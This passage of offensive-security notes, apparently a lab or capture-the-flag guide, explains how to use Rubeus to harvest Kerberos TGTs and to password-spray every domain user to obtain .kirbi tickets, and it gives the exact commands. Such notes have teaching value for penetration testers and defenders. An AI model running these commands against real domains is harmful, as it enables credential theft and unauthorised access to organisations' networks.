**Harvesting Tickets**

This command tells Rubeus to harvest for TGTs every 30 seconds

```
Rubeus.exe harvest /interval:30 /nowrap
```
**Brute-Forcing / Password-Spraying**

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 
```
echo <DC ip> <domain name> >> C:\Windows\System32\drivers\etc\hosts
```
This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user :
```
Rubeus.exe brute /password:Password1 /noticket /nowrap
```








